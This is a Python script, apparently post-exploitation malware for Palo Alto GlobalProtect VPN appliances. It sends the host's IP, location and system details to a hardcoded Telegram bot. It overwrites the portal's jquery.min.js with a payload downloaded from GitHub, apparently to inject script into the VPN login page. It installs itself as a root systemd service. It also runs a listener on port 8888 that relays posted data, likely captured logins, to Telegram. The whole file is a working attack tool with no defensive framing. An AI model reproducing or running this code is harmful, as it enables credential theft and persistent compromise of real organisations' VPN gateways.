import subprocess
import sys
import os
import hashlib
import platform
import requests
from time import sleep
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–≥–æ –ø–∞–∫–µ—Ç–∞
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø–∞–∫–µ—Ç—ã
required_packages = ['requests']

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install(package)

# –¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–∞–∫–µ—Ç—ã
import requests

# –¢–æ–∫–µ–Ω –∏ Chat ID –¥–ª—è Telegram
bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
chat_id = '-1002252120859'

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—É–±–ª–∏—á–Ω–æ–≥–æ IP
def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get('ip')
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error obtaining public IP: {e}")
        return None

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–æ IP
def get_ip_geolocation(ip):
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown'), data.get('city', 'Unknown')
        else:
            return 'Unknown', 'Unknown'
    except requests.exceptions.RequestException as e:
        print(f"Error obtaining geolocation: {e}")
        return 'Unknown', 'Unknown'

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è IP (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—É–±–ª–∏—á–Ω—ã–π IP —Å–µ—Ä–≤–µ—Ä–∞)
def hash_ip(ip):
    return hashlib.sha256(ip.encode('utf-8')).hexdigest()

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram
def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(url, params=params, verify=False)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

# –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –ø–µ—Ä–≤—ã–π –∑–∞–ø—Ä–æ—Å
def get_system_info():
    system_info = {
        "Platform": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    return "\n".join([f"{key}: {value}" for key, value in system_info.items()])

# –ü–æ–¥–º–µ–Ω–∞ —Ñ–∞–π–ª–∞ (—Å—Å—ã–ª–∫–∞ –Ω–∞ —Ñ–∞–π–ª –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏)
def replace_script_file():
    url = 'https://raw.githubusercontent.com/EncHub/PanOS/refs/heads/main/payload.js'
    file_path = '/var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js'
    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            with open(file_path, 'w') as file:
                file.write(response.text)
            print(f"File {file_path} successfully replaced.")
        else:
            print(f"Failed to download the script. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error replacing the file: {e}")

# –ö–ª–∞—Å—Å –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ HTTP-–∑–∞–ø—Ä–æ—Å–æ–≤
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # –ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–∞
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –¥–∞–Ω–Ω—ã–µ –≤ —Å—Ç—Ä–æ–∫—É
        message = post_data.decode('utf-8')

        if message:
            # –ü–æ–ª—É—á–∞–µ–º –ø—É–±–ª–∏—á–Ω—ã–π IP –∏ —Ö–µ—à–∏—Ä—É–µ–º –µ–≥–æ
            public_ip = get_public_ip()
            if public_ip:
                hashed_ip = hash_ip(public_ip)
                # –î–æ–±–∞–≤–ª—è–µ–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–Ω—ã–π IP –≤ –∫–æ–Ω–µ—Ü —Å–æ–æ–±—â–µ–Ω–∏—è
                message += f"\n#{hashed_ip}"

                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
                send_message_to_telegram(message)

                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç –Ω–∞ –∑–∞–ø—Ä–æ—Å
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"Message received and sent to Telegram.")
            else:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"Failed to retrieve public IP.")
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"No message received.")

# –ó–∞–ø—É—Å–∫ HTTP-—Å–µ—Ä–≤–µ—Ä–∞
def run_server():
    server_address = ('0.0.0.0', 8888)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server started on port 8888...")
    httpd.serve_forever()

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ —Ç–µ–∫—É—â–µ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
def setup_autostart():
    script_path = os.path.abspath(__file__)
    autostart_script = f"""
    [Unit]
    Description=Telegram Proxy Server

    [Service]
    ExecStart={sys.executable} {script_path}
    Restart=always
    User=root
    Group=root
    WorkingDirectory={os.path.dirname(script_path)}

    [Install]
    WantedBy=multi-user.target
    """
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ systemd —Ñ–∞–π–ª –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞
    systemd_path = '/etc/systemd/system/telegram_proxy.service'
    with open(systemd_path, 'w') as f:
        f.write(autostart_script)
    
    # –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º —Å–µ—Ä–≤–∏—Å –¥–ª—è –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞
    subprocess.run(["systemctl", "daemon-reload"])
    subprocess.run(["systemctl", "enable", "telegram_proxy.service"])
    subprocess.run(["systemctl", "start", "telegram_proxy.service"])

    # –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ —Å–µ—Ä–≤–∏—Å –∞–∫—Ç–∏–≤–µ–Ω
    return check_autostart_status()

def check_autostart_status():
    try:
        status = subprocess.run(["systemctl", "is-active", "telegram_proxy.service"], capture_output=True, text=True)
        if status.returncode == 0 and status.stdout.strip() == 'active':
            return '‚úÖ'  # –£—Å–ø–µ—Ö
        else:
            return '‚ùå'  # –û—à–∏–±–∫–∞
    except subprocess.CalledProcessError as e:
        print(f"Error checking autostart status: {e}")
        return '‚ùå'  # –û—à–∏–±–∫–∞

if __name__ == '__main__':
    # –ü–æ–ª—É—á–∞–µ–º –ø—É–±–ª–∏—á–Ω—ã–π IP
    public_ip = get_public_ip()

    if public_ip:
        # –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –ø–æ IP
        country, city = get_ip_geolocation(public_ip)

        # –ü–æ–ª—É—á–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
        system_info = get_system_info()

        # –•–µ—à–∏—Ä—É–µ–º –ø—É–±–ª–∏—á–Ω—ã–π IP –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —Ö–µ—à—Ç–µ–≥
        hashed_ip = hash_ip(public_ip)

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ –∏ –ø–æ–ª—É—á–∞–µ–º –∏–∫–æ–Ω–∫—É
        autostart_status_icon = setup_autostart()

        # –°–æ—Å—Ç–∞–≤–ª—è–µ–º –ø–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        initial_message = f"""
        üìç **Server Information:**

        - **User**: {os.getenv("USER", "Unknown")}
        - **IP**: {public_ip}
        - **Country**: {country}
        - **City**: {city}
        
        üìä **System Information:**
        {system_info}

        üîê **Hashed IP**: #{hashed_ip}
        
        üöÄ **Autostart Status**: {autostart_status_icon}
        """

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
        send_message_to_telegram(initial_message)

    # –ü–æ–¥–º–µ–Ω—è–µ–º —Ñ–∞–π–ª —Å–∫—Ä–∏–ø—Ç–∞
    replace_script_file()

    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π
    server_thread = Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    print("Server started on port 8888, listening for messages...")
    print("Autostart has been set up successfully.")
    
    # –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è —Ä–∞–±–æ—Ç—ã
    while True:
        sleep(3600)  # –ü—Ä–æ—Å—Ç–æ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º —Ä–∞–±–æ—Ç—É —Å–∫—Ä–∏–ø—Ç–∞
